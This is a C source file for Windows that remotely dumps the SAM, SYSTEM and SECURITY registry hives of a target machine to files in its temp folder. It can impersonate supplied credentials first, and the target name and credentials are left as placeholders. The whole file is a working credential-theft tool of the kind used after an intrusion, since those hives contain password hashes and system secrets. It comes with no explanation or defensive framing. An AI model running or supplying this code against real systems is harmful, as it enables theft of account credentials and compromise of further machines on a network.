#include <stdio.h>
#include <Windows.h>

void MakeToken() {
    HANDLE token;
    const char username[] = "<username>";
    const char password[] = "<password>";
    const char domain[] = "<domain>";

    if (LogonUserA(username, domain, password, LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_DEFAULT, &token) == 0) {
        printf("LogonUserA: %d\n", GetLastError());
        exit(0);
    }
    if (ImpersonateLoggedOnUser(token) == 0) {
        printf("ImpersonateLoggedOnUser: %d\n", GetLastError());
        exit(0);
    }
}

int main()
{
    HKEY hklm;
    HKEY hkey;
    DWORD result;
    const char* hives[] = { "SAM","SYSTEM","SECURITY" };
    const char* files[] = { "C:\\windows\\temp\\sam.hive","C:\\windows\\temp\\system.hive","C:\\windows\\temp\\security.hive" };
    
    //Uncomment if using alternate credentials.
    //MakeToken();

    result = RegConnectRegistryA("\\\\<computername>", HKEY_LOCAL_MACHINE,&hklm);
    if (result != 0) {
        printf("RegConnectRegistryW: %d\n", result);
        exit(0);
    }
    for (int i = 0; i < 3; i++) {

        printf("Dumping %s hive to %s\n", hives[i], files[i]);
        result = RegOpenKeyExA(hklm, hives[i], REG_OPTION_BACKUP_RESTORE | REG_OPTION_OPEN_LINK, KEY_READ, &hkey);
        if (result != 0) {
            printf("RegOpenKeyExA: %d\n", result);
            exit(0);
        }
        result = RegSaveKeyA(hkey, files[i], NULL);
        if (result != 0) {
            printf("RegSaveKeyA: %d\n", result);
            exit(0);
        }
    }
}
